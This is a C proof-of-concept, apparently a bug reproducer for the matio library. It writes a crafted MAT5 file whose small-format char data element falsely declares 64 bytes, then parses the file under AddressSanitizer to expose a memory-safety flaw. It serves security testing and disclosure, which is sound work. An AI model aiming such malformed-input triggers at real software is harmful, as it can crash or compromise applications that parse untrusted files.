/*
 * PoC: MAT5 char variable whose data element uses the small (data-in-tag)
 * element format. Writes the crafted file to a temp path and reads it back
 * through the public API (Mat_Open/Mat_VarReadNext).
 *
 * Build: cc -fsanitize=address -g -I src -I build/src pocs/mat5_intag_char.c \
 *            -L build -lmatio -Wl,-rpath,build -o /tmp/mat5_intag_char
 * Run:   /tmp/mat5_intag_char            (writes /tmp/mat5_intag_char.mat)
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "matio.h"

#define MI_INT8 1
#define MI_INT32 5
#define MI_UINT32 6
#define MI_MATRIX 14
#define MI_UTF8 16
#define MX_CHAR_CLASS 4

static unsigned char *
put_u32(unsigned char *p, unsigned long v)
{
    p[0] = (unsigned char)(v & 0xff);
    p[1] = (unsigned char)((v >> 8) & 0xff);
    p[2] = (unsigned char)((v >> 16) & 0xff);
    p[3] = (unsigned char)((v >> 24) & 0xff);
    return p + 4;
}

int
main(int argc, char **argv)
{
    const char *path = argc > 1 ? argv[1] : "/tmp/mat5_intag_char.mat";
    unsigned char file_bytes[256];
    unsigned char *p = file_bytes;
    mat_t *mat;
    matvar_t *matvar;
    FILE *fp;
    int i;

    /* 128-byte MAT5 header */
    memcpy(p, "MATLAB 5.0 MAT-file, crafted probe", 34);
    memset(p + 34, ' ', 116 - 34);
    p += 116;
    memset(p, 0, 8); /* subsys offset */
    p += 8;
    p = put_u32(p, 0x4d490100); /* version 0x0100, endian indicator "IM" */

    /* miMATRIX element: array flags, dims, name, data element */
    p = put_u32(p, MI_MATRIX);
    p = put_u32(p, 112); /* nbytes of the payload, padded to an 8-byte multiple */
    p = put_u32(p, MI_UINT32); /* array flags tag */
    p = put_u32(p, 8);
    p = put_u32(p, MX_CHAR_CLASS);
    p = put_u32(p, 0);
    p = put_u32(p, MI_INT32); /* dims tag: 1x1 */
    p = put_u32(p, 8);
    p = put_u32(p, 1);
    p = put_u32(p, 1);
    p = put_u32(p, (1UL << 16) | MI_INT8); /* name "a" in the tag */
    p = put_u32(p, 0x61);
    /* data element in the small format: 64 bytes of UTF-8 declared in the
     * tag, with the 64 payload bytes stored after it */
    p = put_u32(p, (64UL << 16) | MI_UTF8);
    for ( i = 0; i < 64; i++ )
        *p++ = 'B';
    while ( (p - file_bytes) % 8 != 0 )
        *p++ = 0;

    fp = fopen(path, "wb");
    if ( fp == NULL ) {
        perror("fopen");
        return 1;
    }
    if ( fwrite(file_bytes, 1, (size_t)(p - file_bytes), fp) != (size_t)(p - file_bytes) ) {
        fclose(fp);
        return 1;
    }
    fclose(fp);

    mat = Mat_Open(path, MAT_ACC_RDONLY);
    if ( mat == NULL ) {
        fprintf(stderr, "Mat_Open failed\n");
        return 1;
    }
    while ( (matvar = Mat_VarReadNext(mat)) != NULL ) {
        printf("var %s class %u nbytes %u\n", matvar->name, matvar->class_type,
               (unsigned)matvar->nbytes);
        Mat_VarFree(matvar);
    }
    Mat_Close(mat);
    return 0;
}
